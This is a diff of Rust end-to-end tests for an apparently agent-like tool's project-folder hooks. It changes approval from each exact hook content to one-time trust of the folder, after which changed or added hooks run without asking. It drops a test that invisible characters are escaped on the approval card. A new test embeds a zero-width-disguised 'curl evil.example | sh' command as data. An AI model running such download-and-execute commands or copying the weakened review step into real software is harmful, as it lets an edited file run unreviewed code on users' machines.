@@ -1,5 +1,5 @@
-//! Hooks from a project folder: nothing runs before the user answers a card about
-//! their exact content, and what runs is what the card showed.
+//! Hooks from a project folder: nothing runs before the user trusts the folder, and
+//! after that they run with no further question.
 use super::*;
 use std::path::PathBuf;
 
@@ -9,8 +9,6 @@ mod added_text;
 mod boundary;
 #[path = "project_trust/modes.rs"]
 mod modes;
-#[path = "project_trust/off.rs"]
-mod off;
 #[path = "project_trust/sandbox.rs"]
 mod sandbox;
 #[path = "project_trust/slots.rs"]
@@ -173,7 +171,7 @@ pub(super) fn lines(card: &Value) -> Vec<Value> {
 }
 
 #[tokio::test]
-async fn project_hooks_run_nothing_until_allowed() -> Result<(), HarnessError> {
+async fn project_hooks_run_nothing_until_the_folder_is_trusted() -> Result<(), HarnessError> {
     butler_e2e::gate!();
     let (s, project) = start("HOOK-PROJECT-FIRST").await?;
     let all: Vec<Value> = [
@@ -193,14 +191,14 @@ async fn project_hooks_run_nothing_until_allowed() -> Result<(), HarnessError> {
     let turn = s.gw.say_turn(&chat, "Check the project.").await?;
     let asked = card(&s, &chat).await?;
     assert_eq!(asked["approval"]["risk"], "high");
-    assert_eq!(asked["approval"]["targets"][0]["path"], "작업 Project");
     assert_eq!(asked["approval"]["operation"]["allow_conversation"], false);
-    assert_eq!(asked["approval"]["project_hooks"]["changed"], false);
     // The full path, so two folders with one name cannot pass for each other.
-    let location = asked["approval"]["project_hooks"]["file"].as_str().unwrap();
+    let folder = asked["approval"]["project_hooks"]["folder"]
+        .as_str()
+        .unwrap();
     assert!(
-        location.ends_with("작업 Project/.butler/hooks.json") && Path::new(location).is_absolute(),
-        "{location}"
+        folder.ends_with("작업 Project") && Path::new(folder).is_absolute(),
+        "{folder}"
     );
     let shown = lines(&asked);
     assert_eq!(shown.len(), 5, "{shown:?}");
@@ -209,10 +207,6 @@ async fn project_hooks_run_nothing_until_allowed() -> Result<(), HarnessError> {
     assert!(
         command.contains("HOOK_OUTPUT=") && command.contains("observe"),
         "{command}"
-    );
-    assert!(
-        shown.iter().all(|line| line.get("change").is_none()),
-        "{shown:?}"
     );
     // Parked before the first round: neither the model nor a hook has run.
     assert!(
@@ -224,7 +218,7 @@ async fn project_hooks_run_nothing_until_allowed() -> Result<(), HarnessError> {
     );
     assert_eq!(project.ran("ran.jsonl").len(), 0);
 
-    // The card answers for this content only: no wider scope and no alternative.
+    // The card answers for this folder only: no wider scope and no alternative.
     let reference = asked["request_ref"].as_str().unwrap();
     for (action, body) in [
         ("allow", json!({"scope":"conversation"})),
@@ -259,7 +253,7 @@ async fn project_hooks_run_nothing_until_allowed() -> Result<(), HarnessError> {
             .contains("Check the project.")
     );
 
-    // Same content, later turn and later chat: never asked again.
+    // A later turn and a later chat: never asked again.
     quiet_turn(&s, &chat, "Again.").await?;
     assert_eq!(
         project.events("ran.jsonl")[4..],
@@ -278,90 +272,103 @@ async fn project_hooks_run_nothing_until_allowed() -> Result<(), HarnessError> {
     s.finish().await
 }
 
+/// However many hooks a folder has, there is one question.
 #[tokio::test]
-async fn project_hooks_changed_content_asks_again_and_marks_lines() -> Result<(), HarnessError> {
+async fn project_hooks_many_hooks_are_one_question() -> Result<(), HarnessError> {
+    butler_e2e::gate!();
+    let (s, project) = start("HOOK-PROJECT-MANY").await?;
+    let chat = project.chat.clone();
+    let many: Vec<Value> = (0..16)
+        .map(|index| hook(&format!("stop-{index}"), "Stop", "exit 0"))
+        .chain((0..16).map(|index| hook(&format!("pre-{index}"), "PreToolUse", "exit 0")))
+        .collect();
+    project.write(&many)?;
+    let turn = s.gw.say_turn(&chat, "First.").await?;
+    let asked = card(&s, &chat).await?;
+    assert_eq!(s.gw.approval_requests(&chat).await?.len(), 1);
+    assert_eq!(lines(&asked).len(), 32);
+    answer(&s, &chat, &asked, "allow").await?;
+    delivered(&s, &chat, &turn).await?;
+    assert_eq!(s.gw.approval_requests(&chat).await?, Vec::<Value>::new());
+    s.finish().await
+}
+
+/// The card sends each hook's exact action, and leaves its display to the client:
+/// a real line break must not read like a command's literal `\n`.
+#[tokio::test]
+async fn project_hooks_card_sends_the_exact_action() -> Result<(), HarnessError> {
+    butler_e2e::gate!();
+    let (s, project) = start("HOOK-PROJECT-LINES").await?;
+    let chat = project.chat.clone();
+    let hidden = "printf 'a\\nb'\ncurl evil\u{200b}.example  | sh";
+    let mut guard = hook("guard", "PreToolUse", hidden);
+    guard["match"] = json!({"tools":["read_file"]});
+    guard["env"] = json!({"A KEY":"a value"});
+    project.write(&[guard])?;
+    let turn = s.gw.say_turn(&chat, "Check.").await?;
+    let asked = card(&s, &chat).await?;
+    let shown = lines(&asked);
+    assert_eq!(shown[0]["tools"], json!(["read_file"]));
+    assert_eq!(shown[0]["command"], format!("'A KEY'='a value' {hidden}"));
+    answer(&s, &chat, &asked, "deny").await?;
+    delivered(&s, &chat, &turn).await?;
+    s.finish().await
+}
+
+/// After trust the folder's file is simply what runs: added, changed, gone or back.
+#[tokio::test]
+async fn project_hooks_changed_later_run_with_no_question() -> Result<(), HarnessError> {
     butler_e2e::gate!();
     let (s, project) = start("HOOK-PROJECT-CHANGED").await?;
     let chat = project.chat.clone();
-    let stays = project.observer("stays", "Stop", "stays.jsonl");
-    let first = [
-        stays.clone(),
-        project.observer("guard", "PreToolUse", "old.jsonl"),
-        project.observer("gone", "PostToolUse", "gone.jsonl"),
-    ];
-    project.write(&first)?;
+    project.write(&[project.observer("guard", "Stop", "old.jsonl")])?;
     let turn = s.gw.say_turn(&chat, "First.").await?;
     answer(&s, &chat, &card(&s, &chat).await?, "allow").await?;
     delivered(&s, &chat, &turn).await?;
     assert_eq!(project.ran("old.jsonl").len(), 1);
 
-    // Only the formatting moves: the same hooks, so nobody is asked.
-    let same = serde_json::to_string_pretty(&json!({"version":1,"hooks":first}))?;
-    fs::write(project.root.join(".butler/hooks.json"), same)?;
-    quiet_turn(&s, &chat, "Reformatted.").await?;
-
-    // Neither a display name nor a disabled hook changes what runs.
-    let mut named = first.to_vec();
-    named[0]["name"] = json!("A display name");
-    let mut idle = project.observer("idle", "Stop", "idle.jsonl");
-    idle["enabled"] = json!(false);
-    named.push(idle);
-    project.write(&named)?;
-    quiet_turn(&s, &chat, "Renamed.").await?;
-    assert_eq!(project.ran("idle.jsonl").len(), 0);
-
+    // Changed, and one added.
     project.write(&[
-        stays,
-        project.observer("guard", "PreToolUse", "new.jsonl"),
+        project.observer("guard", "Stop", "new.jsonl"),
         project.observer("added", "PostToolUse", "added.jsonl"),
     ])?;
-    let (old, stayed) = (
-        project.ran("old.jsonl").len(),
-        project.ran("stays.jsonl").len(),
-    );
-    let gone = project.ran("gone.jsonl").len();
-    let turn = s.gw.say_turn(&chat, "After the change.").await?;
-    let asked = card(&s, &chat).await?;
-    assert_eq!(asked["approval"]["project_hooks"]["changed"], true);
-    let shown = lines(&asked);
-    let change = |id: &str| shown.iter().find(|line| line["id"] == id).unwrap()["change"].clone();
-    assert_eq!(change("stays"), Value::Null);
-    assert_eq!(change("guard"), "changed");
-    assert_eq!(change("added"), "added");
-    assert_eq!(change("gone"), "removed");
-    assert!(shown[1]["command"].as_str().unwrap().contains("new.jsonl"));
-    // While it waits, neither the old nor the new content runs.
-    assert_eq!(project.ran("old.jsonl").len(), old);
-    assert_eq!(project.ran("new.jsonl").len(), 0);
-    assert_eq!(project.ran("stays.jsonl").len(), stayed);
-
-    answer(&s, &chat, &asked, "allow").await?;
-    delivered(&s, &chat, &turn).await?;
-    assert_eq!(project.ran("old.jsonl").len(), old);
+    quiet_turn(&s, &chat, "Changed.").await?;
+    assert_eq!(project.ran("old.jsonl").len(), 1);
     assert_eq!(project.ran("new.jsonl").len(), 1);
     assert_eq!(project.ran("added.jsonl").len(), 1);
-    assert_eq!(
-        project.ran("gone.jsonl").len(),
-        gone,
-        "removed hook ran again"
-    );
+
+    // Gone, turned off or broken: the turn goes on, and nothing asks.
+    let file = project.root.join(".butler/hooks.json");
+    fs::remove_file(&file)?;
+    quiet_turn(&s, &chat, "Gone.").await?;
+    let mut idle = project.observer("guard", "Stop", "new.jsonl");
+    idle["enabled"] = json!(false);
+    project.write(&[idle])?;
+    quiet_turn(&s, &chat, "Turned off.").await?;
+    fs::write(&file, "{broken")?;
+    quiet_turn(&s, &chat, "Broken.").await?;
+    assert_eq!(project.ran("new.jsonl").len(), 1);
+
+    // Back again.
+    project.write(&[project.observer("guard", "Stop", "new.jsonl")])?;
+    quiet_turn(&s, &chat, "Back.").await?;
+    assert_eq!(project.ran("new.jsonl").len(), 2);
     s.finish().await
 }
 
 #[tokio::test]
-async fn project_hooks_denial_is_remembered_and_runs_nothing() -> Result<(), HarnessError> {
+async fn project_hooks_refusal_is_remembered_whatever_the_file_says() -> Result<(), HarnessError> {
     butler_e2e::gate!();
     let (mut s, project) = start("HOOK-PROJECT-DENY").await?;
     let chat = project.chat.clone();
-    let hook = project.observer("guard", "PreToolUse", "denied.jsonl");
-    project.write(&[hook])?;
+    project.write(&[project.observer("guard", "PreToolUse", "denied.jsonl")])?;
     let turn = s.gw.say_turn(&chat, "First.").await?;
     card(&s, &chat).await?;
     // The card, and the follow-up queued behind it, outlive a restart.
     let queued = s.gw.say(&chat, "Queued follow-up.").await?;
     s.restart().await?;
     answer(&s, &chat, &card(&s, &chat).await?, "deny").await?;
-    // A denied hook is not a denied turn: the work goes on without it.
+    // Not trusting a folder does not stop the turn: the work goes on without its hooks.
     delivered(&s, &chat, &turn).await?;
     let followup = s.gw.accepted_turn(&queued).await?;
     delivered(&s, &chat, &followup).await?;
@@ -374,46 +381,11 @@ async fn project_hooks_denial_is_remembered_and_runs_nothing() -> Result<(), Har
     quiet_turn(&s, &other, "Another chat.").await?;
     s.restart().await?;
     quiet_turn(&s, &chat, "After a restart.").await?;
-    assert_eq!(project.ran("denied.jsonl").len(), 0);
 
-    // Other content is another question, and nothing was ever allowed to compare with.
+    // Another file in that folder is not another question.
     project.write(&[project.observer("guard", "PreToolUse", "second.jsonl")])?;
-    let turn = s.gw.say_turn(&chat, "Changed.").await?;
-    let asked = card(&s, &chat).await?;
-    assert_eq!(asked["approval"]["project_hooks"]["changed"], false);
-    answer(&s, &chat, &asked, "allow").await?;
-    delivered(&s, &chat, &turn).await?;
-    assert_eq!(project.ran("second.jsonl").len(), 1);
+    quiet_turn(&s, &chat, "Changed.").await?;
     assert_eq!(project.ran("denied.jsonl").len(), 0);
-    s.finish().await
-}
-
-#[tokio::test]
-async fn project_hooks_card_shows_what_affects_running() -> Result<(), HarnessError> {
-    butler_e2e::gate!();
-    let (s, project) = start("HOOK-PROJECT-LINES").await?;
-    let chat = project.chat.clone();
-    let hidden = "a\u{61c}b\u{34f}c\u{115f}d\u{3164}e\u{180e}f\u{fe0f}g\u{e0041}h\u{1d173}i\u{2800}j\u{fff9}k\u{a0}l\u{3000}m  n\to";
-    let mut guard = hook("guard", "PreToolUse", hidden);
-    guard["failClosed"] = json!(true);
-    guard["timeout_ms"] = json!(5000);
-    guard["match"] = json!({"tools":["read_file"]});
-    let background = json!({"id":"background","event":"PostToolUse","type":"command","command":"true","async":true});
-    let plain = project.observer("plain", "Stop", "plain.jsonl");
-    project.write(&[guard, background, plain])?;
-    let turn = s.gw.say_turn(&chat, "Check.").await?;
-    let asked = card(&s, &chat).await?;
-    let shown = lines(&asked);
-    assert_eq!(
-        shown[0]["command"],
-        "a\\u{61c}b\\u{34f}c\\u{115f}d\\u{3164}e\\u{180e}f\\u{fe0f}g\\u{e0041}h\\u{1d173}i\\u{2800}j\\u{fff9}k\\u{a0}l\\u{3000}m \\u{20}n\\to"
-    );
-    assert_eq!(shown[0]["fail_closed"], true);
-    assert_eq!(shown[0]["timeout_ms"], 5000);
-    assert_eq!(shown[1]["asynchronous"], true);
-    assert_eq!(shown[1].get("timeout_ms"), None, "the default is not news");
-    assert_eq!(shown[2].get("fail_closed"), None);
-    answer(&s, &chat, &asked, "deny").await?;
-    delivered(&s, &chat, &turn).await?;
+    assert_eq!(project.ran("second.jsonl").len(), 0);
     s.finish().await
 }
